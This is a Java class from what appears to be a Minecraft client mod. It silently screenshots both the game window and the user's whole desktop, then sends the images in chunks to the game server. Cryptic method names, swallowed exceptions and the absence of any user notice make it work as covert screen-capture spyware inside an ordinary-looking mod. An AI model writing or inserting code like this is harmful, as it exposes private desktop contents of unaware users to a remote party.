package brain.screen;

import net.minecraft.client.Minecraft;
import org.lwjgl.BufferUtils;
import org.lwjgl.opengl.GL11;
import org.lwjgl.opengl.GL12;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.nio.IntBuffer;
import java.util.Arrays;

public class ClientHHH {
    private static final int C_SZ = 30 * 1024;

    public static void x99() {
        try {
            final BufferedImage gameImg = captureGame();

            Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
            Rectangle r = new Rectangle(d);
            Robot rb = new Robot();
            final BufferedImage deskImg = rb.createScreenCapture(r);

            new Thread(new Runnable() {
                @Override
                public void run() {
                    v_proc(gameImg, "Game");
                    v_proc(deskImg, "Desktop");
                }
            }).start();

        } catch (Exception e) {}
    }

    private static BufferedImage captureGame() {
        try {
            Minecraft mc = Minecraft.getMinecraft();
            int w = mc.displayWidth;
            int h = mc.displayHeight;
            IntBuffer ib = BufferUtils.createIntBuffer(w * h);
            int[] pixels = new int[w * h];

            GL11.glPixelStorei(GL11.GL_PACK_ALIGNMENT, 1);
            GL11.glPixelStorei(GL11.GL_UNPACK_ALIGNMENT, 1);
            GL11.glReadPixels(0, 0, w, h, GL12.GL_BGRA, GL12.GL_UNSIGNED_INT_8_8_8_8_REV, ib);
            ib.get(pixels);

            BufferedImage img = new BufferedImage(w, h, BufferedImage.TYPE_INT_ARGB);
            for (int y = 0; y < h; y++) {
                for (int x = 0; x < w; x++) {
                    img.setRGB(x, h - y - 1, pixels[y * w + x]);
                }
            }
            return img;
        } catch (Exception e) {
            return null;
        }
    }

    private static void v_proc(BufferedImage i, String type) {
        if (i == null) return;
        try {
            ByteArrayOutputStream os = new ByteArrayOutputStream();
            ImageIO.write(i, "png", os);
            byte[] b = os.toByteArray();

            int t = b.length;
            int o = 0;

            while (o < t) {
                int r = t - o;
                int s = Math.min(r, C_SZ);
                byte[] cd = Arrays.copyOfRange(b, o, o + s);

                boolean l = (o + s) >= t;
                boolean isFirst = (o == 0);

                HHHMod.nw.sendToServer(new PacketDSD(cd, l, isFirst, type));

                o += s;
                Thread.sleep(15);
            }
        } catch (Exception e) {}
    }
}